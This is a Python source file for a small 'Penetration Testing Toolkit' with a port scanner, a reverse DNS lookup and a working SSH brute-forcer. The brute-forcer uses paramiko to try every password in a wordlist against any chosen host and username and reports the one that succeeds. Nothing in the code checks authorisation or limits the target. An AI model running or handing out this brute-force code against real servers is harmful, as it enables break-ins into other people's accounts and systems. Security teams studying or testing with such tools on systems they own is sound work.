import socket
import paramiko
import threading
import time
import dns.resolver
import pyfiglet
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# List of well-known ports to scan
WELL_KNOWN_PORTS = [22, 80, 443, 21, 53, 25, 110, 3389, 3306, 8080]

# Module 1: Port Scanner
def port_scanner(target):
    """Scan for open well-known ports on a given target (IP/URL)."""
    print(Fore.GREEN + f"Scanning {target} for open well-known ports...")
    open_ports = []
    
    for port in WELL_KNOWN_PORTS:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Timeout after 1 second
        
        result = sock.connect_ex((target, port))
        if result == 0:
            print(Fore.CYAN + f"Port {port} is OPEN")
            open_ports.append(port)
        sock.close()
    
    if not open_ports:
        print(Fore.RED + "No open ports found.")
    return open_ports

# Module 2: SSH Brute-Forcer
def ssh_bruteforce(target, username, password_or_wordlist, is_wordlist=False):
    """Perform brute-force SSH login using a username and a password/wordlist."""
    print(Fore.GREEN + f"Attempting to login to {target} as {username}...")
    if is_wordlist:
        with open(password_or_wordlist, 'r') as file:
            passwords = file.readlines()
        
        for password in passwords:
            password = password.strip()
            success = try_ssh_login(target, username, password)
            if success:
                print(Fore.YELLOW + f"Login successful with password: {password}")
                break
    else:
        success = try_ssh_login(target, username, password_or_wordlist)
        if success:
            print(Fore.YELLOW + f"Login successful with password: {password_or_wordlist}")
        else:
            print(Fore.RED + "Login failed.")

# Helper function to attempt SSH login
def try_ssh_login(target, username, password):
    """Attempt SSH login using Paramiko."""
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(target, username=username, password=password, timeout=5)
        ssh_client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(Fore.RED + f"Error connecting to {target}: {e}")
        return False

# Module 3: DNS Lookup
def dns_lookup(target):
    """Perform DNS lookup to resolve IP to domain name."""
    print(Fore.GREEN + f"Resolving DNS for IP address: {target}...")
    try:
        result = socket.gethostbyaddr(target)
        print(Fore.CYAN + f"DNS lookup successful: {result[0]} resolves to {result[2]}")
    except socket.herror:
        print(Fore.RED + f"DNS lookup failed for IP: {target}. No PTR record found.")
    except Exception as e:
        print(Fore.RED + f"Error during DNS lookup: {e}")

# Main Menu
def display_menu():
    print(Fore.MAGENTA + "\nPenetration Testing Toolkit")
    print(Fore.YELLOW + "Owner: Mihir Patel\n")
    print(Fore.CYAN + "1. Port Scanner (Well-known Ports)")
    print(Fore.CYAN + "2. SSH Brute-Forcer")
    print(Fore.CYAN + "3. DNS Lookup (Resolve IP to Domain)")
    print(Fore.CYAN + "0. Exit")
    choice = input(Fore.GREEN + "Enter choice: ")
    return choice

def main():
    # Display ASCII art for the toolkit name
    ascii_art = pyfiglet.figlet_format("PENETRATION TESTING TOOLKIT")
    print(Fore.YELLOW + ascii_art)
    
    while True:
        choice = display_menu()

        if choice == '1':  # Port Scanner
            target = input(Fore.GREEN + "Enter target IP/URL: ")
            port_thread = threading.Thread(target=port_scanner, args=(target,))
            port_thread.start()
            port_thread.join()  # Wait for the port scanner thread to finish

        elif choice == '2':  # SSH Brute-Forcer
            target = input(Fore.GREEN + "Enter target IP/URL: ")
            username = input(Fore.GREEN + "Enter SSH username: ")
            password_or_wordlist = input(Fore.GREEN + "Enter password or path to wordlist: ")
            is_wordlist = input(Fore.GREEN + "Is this a wordlist? (y/n): ").strip().lower() == 'y'
            ssh_thread = threading.Thread(target=ssh_bruteforce, args=(target, username, password_or_wordlist, is_wordlist))
            ssh_thread.start()
            ssh_thread.join()  # Wait for the SSH brute-force thread to finish

        elif choice == '3':  # DNS Lookup
            target = input(Fore.GREEN + "Enter IP address for DNS lookup: ")
            dns_lookup(target)

        elif choice == '0':  # Exit
            print(Fore.RED + "Exiting toolkit...")
            break

        else:
            print(Fore.RED + "Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
